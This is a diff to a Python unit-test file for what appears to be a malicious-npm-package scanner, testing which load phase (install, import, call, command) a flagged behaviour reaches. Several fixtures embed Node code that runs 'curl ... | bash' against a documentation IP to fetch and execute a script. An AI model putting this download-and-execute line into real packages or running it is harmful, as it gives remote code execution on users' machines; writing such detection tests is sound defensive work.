@@ -282,12 +282,12 @@ class Verdict(unittest.TestCase):
 
 # ------------------------------------------------------------------------------------------------ JavaScript (guard/behavior/js.py)
 
-def npm_package(files: dict, scripts: dict | None = None) -> tuple[list[Path], list[str]]:
+def npm_package(files: dict, scripts: dict | None = None, fields: dict | None = None) -> tuple[list[Path], list[str]]:
     """An unpacked npm tarball (<tmp>/pkg-1.0.tgz.unpacked/package/...) plus its lifecycle files, as sources/npm does."""
     tmp = Path(tempfile.mkdtemp())
     root = tmp / "pkg-1.0.tgz.unpacked" / "package"
     files = dict(files)
-    files["package.json"] = json.dumps({"name": "pkg", "version": "1.0", "scripts": scripts or {}})
+    files["package.json"] = json.dumps({"name": "pkg", "version": "1.0", "scripts": scripts or {}, **(fields or {})})
     for rel, text in files.items():
         p = root / rel
         p.parent.mkdir(parents=True, exist_ok=True)
@@ -298,9 +298,9 @@ def npm_package(files: dict, scripts: dict | None = None) -> tuple[list[Path], l
     return out, install_files
 
 
-def js_facts(files: dict, scripts: dict | None = None) -> set:
+def js_facts(files: dict, scripts: dict | None = None, fields: dict | None = None) -> set:
     """{(finding, phase)} - the JS / shell part of behavior.analyze_files, without the Python front end."""
-    paths, install_files = npm_package(files, scripts)
+    paths, install_files = npm_package(files, scripts, fields)
     feats = types.SimpleNamespace(ecosystem="npm", install_time_files=install_files, evidence=[])
     ctx = behavior.Context()
     for path, rel, lang, phase in behavior.plan(paths, feats):
@@ -421,7 +421,33 @@ class JSPhases(unittest.TestCase):
         src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
         got = js_facts({"install.js": src}, {"postinstall": "node install.js"})
         self.assertIn(("download_exec", "install"), got)
+        got = js_facts({"lib/x.js": src}, fields={"main": "lib/x.js"})
+        self.assertIn(("download_exec", "import"), got)
+
+    def test_load_reaches_files(self):
+        """Loading the package runs the entry files and what they require; other files run only when asked for by path."""
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        got = js_facts({"index.js": "module.exports = require('./lib/a');\n", "lib/a.js": "require('../dist/b.js');\n", "dist/b.js": src})
+        self.assertIn(("download_exec", "import"), got)
+        got = js_facts({"index.js": "export * from './lib/a.mjs';\n", "lib/a.mjs": src})
+        self.assertIn(("download_exec", "import"), got)
+        got = js_facts({"index.js": "module.exports = 1;\n", "dist/browser.global.js": src})
+        self.assertIn(("download_exec", "call"), got)                     # a browser build nothing loads
         got = js_facts({"lib/x.js": src})
+        self.assertIn(("download_exec", "call"), got)                     # no main and no index.js: nothing runs on load
+        got = js_facts({"x.js": src}, fields={"exports": {".": {"require": "./x.js"}}})
+        self.assertIn(("download_exec", "import"), got)
+        got = js_facts({"cli.js": src}, fields={"bin": {"pkg": "cli.js"}})
+        self.assertIn(("download_exec", "command"), got)
+        got = js_facts({"pkg/index.js": "module.exports = 1;\n", "index.js": "require('./pkg');\n", "pkg/package.json": '{"main": "m.js"}', "pkg/m.js": src})
+        self.assertIn(("download_exec", "import"), got)                   # a folder's own package.json main
+
+    def test_computed_require_keeps_every_file(self):
+        """A loaded file that requires a computed name could reach any file: every file is taken to run on load."""
+        src = "require('child_process').execSync('curl -s http://203.0.113.4/i.sh | bash');\n"
+        got = js_facts({"index.js": "const p = './' + 'pay' + 'load';\nrequire(p);\n", "payload.js": src})
+        self.assertIn(("download_exec", "import"), got)
+        got = js_facts({"index.js": "import(name);\n", "dist/x.js": src})
         self.assertIn(("download_exec", "import"), got)
 
     def test_lifecycle_inline_node_code(self):
